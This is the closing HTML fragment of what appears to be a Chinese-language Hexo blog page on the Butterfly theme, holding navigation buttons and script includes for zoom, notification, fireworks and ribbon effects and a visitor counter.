class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
